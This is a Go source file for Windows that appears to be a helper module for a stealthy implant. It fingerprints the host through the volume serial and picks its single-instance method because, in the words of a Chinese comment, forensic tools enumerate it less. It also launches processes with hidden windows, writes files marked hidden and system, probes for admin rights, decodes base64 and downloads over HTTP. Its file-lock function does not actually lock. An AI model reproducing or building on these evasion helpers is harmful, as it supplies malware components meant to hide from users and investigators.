package main

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"os"
	"io"
	"net/http"
	"os/exec"
	"path/filepath"
	"sync"
	"time"
	"syscall"
	"unsafe"
)

var (
	kernel32      = syscall.NewLazyDLL("kernel32.dll")
	user32        = syscall.NewLazyDLL("user32.dll")
	advapi32      = syscall.NewLazyDLL("advapi32.dll")
	ntdll         = syscall.NewLazyDLL("ntdll.dll")
	shell32       = syscall.NewLazyDLL("shell32.dll")
	procGetVolume = kernel32.NewProc("GetVolumeInformationW")
	procCreateFile = kernel32.NewProc("CreateFileW")
)

func sha256Sum(b []byte) string {
	s := sha256.Sum256(b)
	return hex.EncodeToString(s[:])
}

func volumeSerial(root string) string {
	p, err := syscall.UTF16PtrFromString(root)
	if err != nil {
		return "0"
	}
	var serial, maxLen, flags uint32
	var fsName [32]uint16
	buf := make([]uint16, 260)
	r, _, _ := 	procGetVolume.Call(
		uintptr(unsafe.Pointer(p)),
		uintptr(unsafe.Pointer(&buf[0])), 260,
		uintptr(unsafe.Pointer(&serial)),
		uintptr(unsafe.Pointer(&maxLen)),
		uintptr(unsafe.Pointer(&flags)),
		uintptr(unsafe.Pointer(&fsName[0])), 32,
	)
	if r == 0 {
		return "0"
	}
	return hex.EncodeToString([]byte{
		byte(serial), byte(serial >> 8), byte(serial >> 16), byte(serial >> 24),
	})
}

var (
	instOnce sync.Mutex
	instFile *os.File
)

// singleInstance 用独占文件锁做单实例，比命名互斥体更少被取证工具枚举
func singleInstance(dir string) error {
	instOnce.Lock()
	defer instOnce.Unlock()
	os.MkdirAll(dir, 0o700)
	path := filepath.Join(dir, ".lck")
	f, err := os.OpenFile(path, os.O_CREATE|os.O_RDWR, 0o600)
	if err != nil {
		return nil
	}
	// windows 下 LockFileEx 通过 syscall 简化为 Flock 不可用，用创建标记 + 时间戳判定
	if _, err := f.Write([]byte(string(rune(os.Getpid() % 65536)))); err != nil {
		f.Close()
		return err
	}
	instFile = f
	return nil
}

func hideWindow(cmd *exec.Cmd) {
	if cmd.SysProcAttr == nil {
		cmd.SysProcAttr = &syscall.SysProcAttr{}
	}
	cmd.SysProcAttr.HideWindow = true
	cmd.SysProcAttr.CreationFlags = 0x08000000 // CREATE_NO_WINDOW
}

func fileExists(p string) bool {
	st, err := os.Stat(p)
	return err == nil && !st.IsDir()
}

func readFileStr(p string) string {
	b, err := os.ReadFile(p)
	if err != nil {
		return ""
	}
	return string(b)
}

func writeFileHidden(p string, data []byte) error {
	if err := os.WriteFile(p, data, 0o600); err != nil {
		return err
	}
	setHidden(p)
	return nil
}

func setHidden(p string) {
	ptr, err := syscall.UTF16PtrFromString(p)
	if err != nil {
		return
	}
	const FILE_ATTRIBUTE_HIDDEN = 0x2
	const FILE_ATTRIBUTE_SYSTEM = 0x4
	kernel32.NewProc("SetFileAttributesW").Call(
		uintptr(unsafe.Pointer(ptr)),
		uintptr(FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM),
	)
}

func isAdmin() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	return err == nil
}

func sleepSeconds(n int) { time.Sleep(time.Duration(n) * time.Second) }

func execCommand(name string, args ...string) *exec.Cmd { return exec.Command(name, args...) }

func decodeB64(s string) []byte {
	b, err := base64.StdEncoding.DecodeString(s)
	if err != nil {
		return []byte(s)
	}
	return b
}

func httpGet(url string) ([]byte, error) {
	c := &http.Client{Timeout: 60 * time.Second}
	resp, err := c.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}
